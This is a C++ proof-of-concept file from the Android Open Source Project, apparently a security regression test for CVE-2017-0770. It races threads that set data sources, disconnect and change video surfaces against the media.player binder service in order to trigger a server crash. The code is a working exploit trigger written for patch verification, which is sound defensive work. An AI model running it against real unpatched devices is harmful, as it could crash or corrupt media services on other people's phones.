/**
 * Copyright (C) 2019 The Android Open Source Project
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

#include <fcntl.h>
#include <binder/IServiceManager.h>
#include <binder/ProcessState.h>
#include <media/IMediaPlayerService.h>
#include <gui/BufferQueue.h>

#include "../includes/common.h"

using namespace android;

time_t test_started;
sp<IMediaPlayer> mp;
static int gFd;

void *setThread1(void *) {
  while (timer_active(test_started)) {
    if (mp != NULL) {
      mp->setDataSource(gFd, 0, 800);
    } else {
      usleep(5000);
    }
  }
  return NULL;
}

void *setThread2(void *) {
  status_t err;
  while (timer_active(test_started)) {
    if (mp != NULL) {
      mp->disconnect();
    } else {
      usleep(5000);
    }
  }
  return NULL;
}

void *setThread3(void *) {
  status_t err;
  while (timer_active(test_started)) {
    if (mp != NULL) {
      sp<IGraphicBufferProducer> producer;
      sp<IGraphicBufferConsumer> consumer;
      BufferQueue::createBufferQueue(&producer, &consumer);
      consumer->setConsumerName(String8("test"));
      consumer->setConsumerUsageBits(GRALLOC_USAGE_HW_VIDEO_ENCODER);

      sp<BufferQueue::ProxyConsumerListener> proxy =
          new BufferQueue::ProxyConsumerListener(NULL);
      consumer->consumerConnect(proxy, false);

      err = mp->setVideoSurfaceTexture(producer);
    } else {
      usleep(5000);
    }
  }
  return NULL;
}

int gDumpFd;
static void *dumpThread(void *) {
  Parcel data, reply;
  data.writeFileDescriptor(gDumpFd, false);
  data.writeInt32(0);

  while (timer_active(test_started)) {
    if (mp != NULL) {
      IInterface::asBinder(mp)->transact(1598311760 /*DUMP_TRANSACTION*/, data, &reply);
    }
  }
  return NULL;
}

class MyDeathRecipient : public IBinder::DeathRecipient {
 public:
  MyDeathRecipient() : mDied(false) {}
  virtual void binderDied(const wp<IBinder> &who __unused) { mDied = true; }
  bool died() const { return mDied; }

 private:
  bool mDied;
};

void poc() {
  const char *fileName = "/sdcard/cve_2017_0770.mp4";
  gFd = open(fileName, O_RDWR | O_CREAT, 0744);

  if (gFd == -1) {
    return;
  }

  pthread_t pt[100];

  for (int i = 20; i < 40; i++) {
    pthread_create(&pt[i], NULL, setThread2, NULL);
  }

  for (int i = 0; i < 20; i++) {
    pthread_create(&pt[i], NULL, setThread1, NULL);
  }

  for (int i = 40; i < 60; i++) {
    pthread_create(&pt[i], NULL, setThread3, NULL);
  }

  while (timer_active(test_started)) {
    sp<IServiceManager> sm = defaultServiceManager();
    if (sm == nullptr) {
      return;
    }

    sp<IBinder> binder = sm->getService(String16("media.player"));
    sp<IMediaPlayerService> mediaPlayerService = interface_cast<IMediaPlayerService>(binder);

    if (mediaPlayerService == NULL) {
      sleep(1);
      binder = sm->getService(String16("media.player"));
      mediaPlayerService = interface_cast<IMediaPlayerService>(binder);
      if (mediaPlayerService == NULL) {
        return;
      }
    }

    sp<MyDeathRecipient> dr = new MyDeathRecipient();
    binder->linkToDeath(dr);

    sp<IMediaPlayerClient> client;
    audio_session_t audioSessionId = AUDIO_SESSION_NONE;
    status_t err;

    mp = mediaPlayerService->create(client, audioSessionId);
    if (mp == NULL) {
      return;
    }
  }
}

int main() {
  test_started = start_timer();
  android::ProcessState::self()->startThreadPool();
  poc();
  return 0;
}
